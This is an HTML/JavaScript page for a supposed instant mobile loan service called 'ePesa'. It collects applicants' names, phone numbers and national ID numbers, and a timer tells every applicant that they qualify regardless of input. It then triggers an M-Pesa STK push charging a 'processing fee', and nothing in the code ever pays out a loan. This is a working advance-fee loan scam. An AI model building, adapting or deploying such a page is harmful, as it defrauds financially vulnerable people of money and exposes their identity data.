<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ePesa - Instant Loans</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    .loan-card:hover { border-color: #0d6efd; cursor: pointer; background: #f0f8ff; }
    .selected { border: 2px solid #0d6efd !important; background: #e7f1ff; }
    #landingPage {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
  </style>
</head>
<body class="bg-light">

<!-- Landing Page -->
<div class="container" id="landingPage">
  <h1 class="mb-3">Welcome to <span class="text-primary">ePesa</span></h1>
  <p class="lead">Get instant mobile loans without CRB, paperwork, or guarantors.</p>
  <button class="btn btn-primary mt-3 px-4" onclick="startApplication()">Apply for a Loan</button>
</div>

<!-- Application Form -->
<div class="container py-4 d-none" id="applicationSection">
  <h3 class="text-center mb-4">Check Your Loan Eligibility</h3>
  <div class="card p-4 shadow-sm mx-auto" style="max-width: 500px;">
    <form id="eligibilityForm">
      <div class="mb-3">
        <label for="fullName" class="form-label">Full Name</label>
        <input type="text" id="fullName" class="form-control" required />
      </div>
      <div class="mb-3">
        <label for="phoneNumber" class="form-label">Phone Number</label>
        <input type="tel" id="phoneNumber" class="form-control" placeholder="07XXXXXXXX" required />
      </div>
      <div class="mb-3">
        <label for="idNumber" class="form-label">ID Number</label>
        <input type="number" id="idNumber" class="form-control" required />
      </div>
      <div class="mb-3">
        <label for="loanType" class="form-label">Loan Type</label>
        <select id="loanType" class="form-select" required>
          <option value="">Select Loan Type</option>
          <option value="Emergency">Emergency</option>
          <option value="Business">Business</option>
          <option value="School Fees">School Fees</option>
        </select>
      </div>
      <div class="text-center">
        <button type="submit" class="btn btn-primary w-100">Check Eligibility</button>
      </div>
    </form>
  </div>
</div>

<!-- Qualified Message -->
<div class="container text-center py-5 d-none" id="qualifiedMessage">
  <h4 class="text-success">Congratulations!</h4>
  <p class="lead">You have qualified for a loan.</p>
  <div class="spinner-border text-primary mt-3"></div>
</div>

<!-- Loan Options -->
<div class="container mt-5 d-none" id="loanOptions">
  <h5 class="text-center mb-3">Select Your Loan Option</h5>
  <div class="row row-cols-2 g-3" id="optionsGrid"></div>
  <div class="text-center mt-4">
    <button class="btn btn-success px-5" id="proceedBtn" disabled>Get My Loan Now</button>
  </div>
</div>

<!-- Loan Confirmation Screen -->
<div class="container py-5 text-center d-none" id="loanConfirmation">
  <div class="card p-4 shadow-sm mx-auto" style="max-width: 450px;">
    <h5 class="mb-3 text-success">Almost there!</h5>
    <p id="loanSummary" class="lead"></p>
    <p>To receive this loan, please complete the one-time processing fee.</p>
    <button class="btn btn-primary mt-3" onclick="confirmModal.show()">Pay Now</button>
  </div>
</div>

<!-- Confirm Phone Modal -->
<div class="modal fade" id="confirmModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content">
      <form id="confirmForm">
        <div class="modal-header">
          <h5 class="modal-title">Confirm Your Phone Number</h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
        </div>
        <div class="modal-body">
          <label for="confirmPhone" class="form-label">MPesa Phone Number</label>
          <input type="tel" id="confirmPhone" class="form-control" required />
        </div>
        <div class="modal-footer">
          <button type="submit" class="btn btn-primary">Pay Processing Fee</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script>
  const landingPage = document.getElementById('landingPage');
  const applicationSection = document.getElementById('applicationSection');
  const qualifiedMessage = document.getElementById('qualifiedMessage');
  const loanOptions = document.getElementById('loanOptions');
  const optionsGrid = document.getElementById('optionsGrid');
  const proceedBtn = document.getElementById('proceedBtn');
  const loanConfirmation = document.getElementById('loanConfirmation');
  const loanSummary = document.getElementById('loanSummary');
  const confirmModal = new bootstrap.Modal(document.getElementById('confirmModal'));
  const confirmPhone = document.getElementById('confirmPhone');
  const confirmForm = document.getElementById('confirmForm');

  let selectedOption = null;
  let applicantPhone = '';

  const loanPackages = [
    { amount: 5500, fee: 100 },
    { amount: 7800, fee: 120 },
    { amount: 9800, fee: 140 },
    { amount: 11200, fee: 180 },
    { amount: 16800, fee: 200 },
    { amount: 21200, fee: 220 }
  ];

  function startApplication() {
    landingPage.classList.add('d-none');
    setTimeout(() => {
      applicationSection.classList.remove('d-none');
    }, 300);
  }

  document.getElementById('eligibilityForm').onsubmit = function (e) {
    e.preventDefault();
    applicantPhone = document.getElementById('phoneNumber').value;
    confirmPhone.value = applicantPhone;

    applicationSection.classList.add('d-none');
    qualifiedMessage.classList.remove('d-none');

    setTimeout(() => alert("You have qualified for a loan! Choose your loan amount next."), 1000);
    setTimeout(() => {
      qualifiedMessage.classList.add('d-none');
      loanOptions.classList.remove('d-none');
      renderLoanOptions();
    }, 2500);
  };

  function renderLoanOptions() {
    optionsGrid.innerHTML = '';
    loanPackages.forEach((pkg, index) => {
      const card = document.createElement('div');
      card.className = 'col';
      card.innerHTML = `
        <div class="card p-3 loan-card" data-index="${index}">
          <h6>Ksh ${pkg.amount.toLocaleString()}</h6>
          <small>Processing Fee: Ksh ${pkg.fee}</small>
        </div>`;
      optionsGrid.appendChild(card);
    });

    document.querySelectorAll('.loan-card').forEach(card => {
      card.onclick = function () {
        document.querySelectorAll('.loan-card').forEach(c => c.classList.remove('selected'));
        this.classList.add('selected');
        selectedOption = loanPackages[this.dataset.index];
        proceedBtn.disabled = false;
      };
    });
  }

  proceedBtn.onclick = () => {
    loanOptions.classList.add('d-none');
    loanConfirmation.classList.remove('d-none');
    loanSummary.innerHTML = `You selected <strong>Ksh ${selectedOption.amount.toLocaleString()}</strong>.<br />
      Processing fee is <strong>Ksh ${selectedOption.fee}</strong>.`;
  };

  confirmForm.onsubmit = async function (e) {
    e.preventDefault();
    const phone = confirmPhone.value.replace(/^0/, '254');
    const fee = selectedOption.fee;

    confirmForm.querySelector('button').innerHTML = 'Processing...';
    confirmForm.querySelector('button').disabled = true;

    try {
      const res = await fetch("https://api.payhero.co.ke/stk-push", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          amount: fee,
          reference: "LoanProcessingFee",
          callback_url: "https://okoapesa.vercel.app/payhero-callback"
        })
      });

      if (res.ok) {
        alert("STK Push sent! Complete the payment on your MPesa.");
        confirmModal.hide();
      } else {
        alert("Failed to send STK push. Try again.");
      }
    } catch (err) {
      alert("Network error. Please try again.");
    }

    confirmForm.querySelector('button').innerHTML = 'Pay Processing Fee';
    confirmForm.querySelector('button').disabled = false;
  };
</script>
</body>
</html>
